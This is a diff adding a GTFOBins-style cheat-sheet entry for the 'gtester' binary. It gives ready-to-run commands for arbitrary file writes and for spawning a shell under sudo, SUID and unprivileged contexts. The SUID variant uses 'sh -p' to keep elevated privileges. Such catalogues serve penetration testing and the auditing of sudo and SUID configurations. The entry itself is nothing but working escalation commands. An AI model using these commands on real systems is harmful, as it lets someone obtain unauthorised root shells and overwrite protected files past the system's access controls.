@@ -1,0 +1,36 @@
+gtester
+=======
+
+File write
+----------
+
+[Sudo]
+    gtester DATA -o /path/to/output-file
+    Data to be written appears in an XML attribute in the output file (`<testbinary path="DATA">`).
+
+[SUID]
+    gtester DATA -o /path/to/output-file
+    Data to be written appears in an XML attribute in the output file (`<testbinary path="DATA">`).
+
+[Unprivileged]
+    gtester DATA -o /path/to/output-file
+    Data to be written appears in an XML attribute in the output file (`<testbinary path="DATA">`).
+
+Shell
+-----
+
+[Sudo]
+    echo 'exec /bin/sh 0<&1' >/path/to/temp-file
+chmod +x /path/to/temp-file
+gtester -q /path/to/temp-file
+
+[SUID]
+    echo '#!/bin/sh -p' >/path/to/temp-file
+echo 'exec /bin/sh -p 0<&1' >>/path/to/temp-file
+chmod +x /path/to/temp-file
+gtester -q /path/to/temp-file
+
+[Unprivileged]
+    echo 'exec /bin/sh 0<&1' >/path/to/temp-file
+chmod +x /path/to/temp-file
+gtester -q /path/to/temp-file
